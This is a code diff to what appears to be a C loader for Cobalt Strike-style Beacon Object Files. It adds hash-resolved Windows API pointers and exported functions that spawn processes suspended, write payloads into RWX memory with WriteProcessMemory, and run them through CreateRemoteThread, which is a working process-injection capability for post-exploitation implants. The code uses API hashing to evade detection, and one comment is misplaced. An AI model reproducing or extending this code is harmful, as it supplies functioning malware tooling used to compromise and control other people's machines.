@@ -68,6 +68,17 @@ typedef int   __stdcall (*pfn_VirtualFree)(void *addr, uint32_t size, uint32_t f
 typedef void *__stdcall (*pfn_LoadLibraryA)(const char *name);
 typedef uint32_t __stdcall (*pfn_GetCurrentProcess)(void);
 typedef int   __stdcall (*pfn_CloseHandle)(void *h);
+typedef int   __stdcall (*pfn_CreateProcessA)(const char *appName, char *cmdLine,
+    void *procAttr, void *threadAttr, int inheritHandles, uint32_t flags,
+    void *env, const char *cwd, void *si, void *pi);
+typedef void *__stdcall (*pfn_VirtualAllocEx)(void *hProc, void *addr, uint32_t size,
+    uint32_t allocType, uint32_t protect);
+typedef int   __stdcall (*pfn_WriteProcessMemory)(void *hProc, void *addr,
+    const void *buf, uint32_t size, uint32_t *outWritten);
+typedef void *__stdcall (*pfn_CreateRemoteThread)(void *hProc, void *attr, uint32_t stack,
+    void *startAddr, void *param, uint32_t flags, uint32_t *outTid);
+typedef int   __stdcall (*pfn_TerminateProcess)(void *h, uint32_t code);
+typedef uint32_t __stdcall (*pfn_ResumeThread)(void *h);
 /* advapi32 */
 typedef int   __stdcall (*pfn_ImpersonateLoggedOnUser)(void *token);
 typedef int   __stdcall (*pfn_RevertToSelf)(void);
@@ -88,9 +99,15 @@ typedef struct {
     pfn_VirtualAlloc       VirtualAlloc;
     pfn_VirtualProtect     VirtualProtect;
     pfn_VirtualFree        VirtualFree;
-    pfn_LoadLibraryA       LoadLibraryA;
-    pfn_GetCurrentProcess  GetCurrentProcess;
-    pfn_CloseHandle        CloseHandle;
+    pfn_LoadLibraryA        LoadLibraryA;
+    pfn_GetCurrentProcess   GetCurrentProcess;
+    pfn_CloseHandle         CloseHandle;
+    pfn_CreateProcessA      CreateProcessA;
+    pfn_VirtualAllocEx      VirtualAllocEx;
+    pfn_WriteProcessMemory  WriteProcessMemory;
+    pfn_CreateRemoteThread  CreateRemoteThread;
+    pfn_TerminateProcess    TerminateProcess;
+    pfn_ResumeThread        ResumeThread;
 } kernel32_api_t;
 
 typedef struct {
@@ -138,7 +155,13 @@ static advapi32_api_t g_aapi;  /* populated lazily on first Token/IsAdmin call *
 #define HASH_VIRTUAL_FREE         0x030633ACu  /* VirtualFree */
 #define HASH_LOAD_LIBRARY_A       0xEC0E4E8Eu  /* LoadLibraryA */
 #define HASH_GET_CURRENT_PROCESS  0x7B8F17E6u  /* GetCurrentProcess */
-#define HASH_CLOSE_HANDLE         0x0FFD97FBu  /* CloseHandle */
+#define HASH_CLOSE_HANDLE         0x0FFD97FBu
+#define HASH_CREATE_PROCESS_A     0x16B3FE72u
+#define HASH_VIRTUAL_ALLOC_EX     0x6E1A959Cu
+#define HASH_WRITE_PROCESS_MEMORY 0xD83D6AA1u
+#define HASH_CREATE_REMOTE_THREAD 0x72BD9CDDu
+#define HASH_TERMINATE_PROCESS    0x78B5B983u
+#define HASH_RESUME_THREAD        0x9E4A3F88u  /* CloseHandle */
 /* advapi32 exports — resolved lazily; loader doesn't require advapi32
  * unless the BOF actually imports a Token/IsAdmin symbol. */
 #define HASH_IMPERSONATE_LOGGED_ON_USER  0x6D821B37u
@@ -201,11 +224,19 @@ static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
     k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
     k->VirtualProtect    = (pfn_VirtualProtect)   resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
     k->VirtualFree       = (pfn_VirtualFree)      resolve_by_hash(k32, HASH_VIRTUAL_FREE);
-    k->LoadLibraryA      = (pfn_LoadLibraryA)     resolve_by_hash(k32, HASH_LOAD_LIBRARY_A);
-    k->GetCurrentProcess = (pfn_GetCurrentProcess)resolve_by_hash(k32, HASH_GET_CURRENT_PROCESS);
-    k->CloseHandle       = (pfn_CloseHandle)      resolve_by_hash(k32, HASH_CLOSE_HANDLE);
+    k->LoadLibraryA       = (pfn_LoadLibraryA)       resolve_by_hash(k32, HASH_LOAD_LIBRARY_A);
+    k->GetCurrentProcess  = (pfn_GetCurrentProcess)  resolve_by_hash(k32, HASH_GET_CURRENT_PROCESS);
+    k->CloseHandle        = (pfn_CloseHandle)        resolve_by_hash(k32, HASH_CLOSE_HANDLE);
+    k->CreateProcessA     = (pfn_CreateProcessA)     resolve_by_hash(k32, HASH_CREATE_PROCESS_A);
+    k->VirtualAllocEx     = (pfn_VirtualAllocEx)     resolve_by_hash(k32, HASH_VIRTUAL_ALLOC_EX);
+    k->WriteProcessMemory = (pfn_WriteProcessMemory) resolve_by_hash(k32, HASH_WRITE_PROCESS_MEMORY);
+    k->CreateRemoteThread = (pfn_CreateRemoteThread) resolve_by_hash(k32, HASH_CREATE_REMOTE_THREAD);
+    k->TerminateProcess   = (pfn_TerminateProcess)   resolve_by_hash(k32, HASH_TERMINATE_PROCESS);
+    k->ResumeThread       = (pfn_ResumeThread)       resolve_by_hash(k32, HASH_RESUME_THREAD);
     return k->ExitThread && k->VirtualAlloc && k->VirtualProtect && k->VirtualFree
-        && k->LoadLibraryA && k->GetCurrentProcess && k->CloseHandle;
+        && k->LoadLibraryA && k->GetCurrentProcess && k->CloseHandle
+        && k->CreateProcessA && k->VirtualAllocEx && k->WriteProcessMemory
+        && k->CreateRemoteThread && k->TerminateProcess && k->ResumeThread;
 }
 
 /* ensure_advapi resolves the advapi32 export set lazily. Returns 1
@@ -276,6 +307,11 @@ static int ensure_advapi(void)
 #define HASH_BEACON_USE_TOKEN            0xB2BEE46Au
 #define HASH_BEACON_REVERT_TOKEN         0xAB981B1Au
 #define HASH_BEACON_IS_ADMIN             0xFC3D55E0u
+/* Inject (step 1.h) */
+#define HASH_BEACON_INJECT_PROCESS              0x56A1044Cu
+#define HASH_BEACON_INJECT_TEMPORARY_PROCESS    0x8414B892u
+#define HASH_BEACON_SPAWN_TEMPORARY_PROCESS     0xF19882B0u
+#define HASH_BEACON_CLEANUP_PROCESS             0x9BD1CDDBu
 
 static uint32_t cstr_len(const char *s)
 {
@@ -788,6 +824,88 @@ __declspec(dllexport) void __cdecl BeaconRevertToken(void)
     g_aapi.RevertToSelf();
 }
 
+/* — Inject + Spawn (step 1.h) -----------------------------------
+ *
+ * The 4 process-control symbols a CS-style post-ex BOF expects:
+ *
+ *   BeaconSpawnTemporaryProcess   CreateProcessA(SpawnTo, CREATE_SUSPENDED)
+ *   BeaconInjectProcess           VirtualAllocEx + WriteProcessMemory +
+ *                                  CreateRemoteThread on an existing handle
+ *   BeaconInjectTemporaryProcess  InjectProcess + ResumeThread on
+ *                                  PROCESS_INFORMATION.hThread
+ *   BeaconCleanupProcess          TerminateProcess + CloseHandle pair
+ *
+ * PROCESS_INFORMATION layout (x86, 16 bytes):
+ *   0:  HANDLE  hProcess
+ *   4:  HANDLE  hThread
+ *   8:  DWORD   dwProcessId
+ *   12: DWORD   dwThreadId
+ *
+ * STARTUPINFOA is consumed by CreateProcessA verbatim — the BOF
+ * owns the struct (typically a zeroed stack local with cb set).
+ */
+
+__declspec(dllexport) int __cdecl BeaconSpawnTemporaryProcess(
+    int bIgnoreToken, int bAlloc, void *si, void *pi)
+{
+    (void)bIgnoreToken;
+    (void)bAlloc;
+    if (!si || !pi || !g_params) return 0;
+    char *cmd = (char *)g_params->spawn_to_addr;
+    if (!cmd) return 0;
+    /* CREATE_SUSPENDED so the BOF can WriteProcessMemory + inject
+     * before the host thread runs. The standard CS pattern. */
+    return g_kapi.CreateProcessA(0, cmd, 0, 0, 0,
+        /* CREATE_SUSPENDED */ 0x04,
+        0, 0, si, pi);
+}
+
+__declspec(dllexport) void __cdecl BeaconInjectProcess(
+    void *hProc, int pid, char *payload, int p_len, int p_offset,
+    char *arg, int a_len)
+{
+    (void)pid;
+    (void)a_len;
+    (void)arg;
+    if (!hProc || !payload || p_len <= 0) return;
+    void *remote = g_kapi.VirtualAllocEx(hProc, 0, (uint32_t)p_len,
+        /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
+        /* PAGE_EXECUTE_READWRITE */ 0x40);
+    if (!remote) return;
+    uint32_t wrote = 0;
+    if (!g_kapi.WriteProcessMemory(hProc, remote, payload, (uint32_t)p_len, &wrote)) return;
+    void *entry = (void *)((uint8_t *)remote + p_offset);
+    /* arg is passed as lpThreadParameter — the BOF is responsible
+     * for embedding/serialising it; the canonical pattern is to
+     * point arg into another VirtualAllocEx region the BOF wrote
+     * separately. */
+    void *th = g_kapi.CreateRemoteThread(hProc, 0, 0, entry, arg, 0, 0);
+    if (th) g_kapi.CloseHandle(th);
+}
+
+__declspec(dllexport) void __cdecl BeaconInjectTemporaryProcess(
+    void *pInfo, char *payload, int p_len, int p_offset,
+    char *arg, int a_len)
+{
+    if (!pInfo) return;
+    void *hProc   = *(void **)pInfo;
+    void *hThread = *((void **)pInfo + 1);
+    BeaconInjectProcess(hProc, 0, payload, p_len, p_offset, arg, a_len);
+    if (hThread) g_kapi.ResumeThread(hThread);
+}
+
+__declspec(dllexport) void __cdecl BeaconCleanupProcess(void *pInfo)
+{
+    if (!pInfo) return;
+    void *hProc   = *(void **)pInfo;
+    void *hThread = *((void **)pInfo + 1);
+    if (hProc) {
+        g_kapi.TerminateProcess(hProc, 0);
+        g_kapi.CloseHandle(hProc);
+    }
+    if (hThread) g_kapi.CloseHandle(hThread);
+}
+
 __declspec(dllexport) int __cdecl BeaconIsAdmin(void)
 {
     if (!ensure_advapi()) return 0;
@@ -840,6 +958,11 @@ static uint32_t beacon_resolve(uint32_t hash)
     if (hash == HASH_BEACON_USE_TOKEN)            return (uint32_t)&BeaconUseToken;
     if (hash == HASH_BEACON_REVERT_TOKEN)         return (uint32_t)&BeaconRevertToken;
     if (hash == HASH_BEACON_IS_ADMIN)             return (uint32_t)&BeaconIsAdmin;
+    /* Inject (step 1.h) */
+    if (hash == HASH_BEACON_SPAWN_TEMPORARY_PROCESS)  return (uint32_t)&BeaconSpawnTemporaryProcess;
+    if (hash == HASH_BEACON_INJECT_PROCESS)           return (uint32_t)&BeaconInjectProcess;
+    if (hash == HASH_BEACON_INJECT_TEMPORARY_PROCESS) return (uint32_t)&BeaconInjectTemporaryProcess;
+    if (hash == HASH_BEACON_CLEANUP_PROCESS)          return (uint32_t)&BeaconCleanupProcess;
     return 0;
 }
 
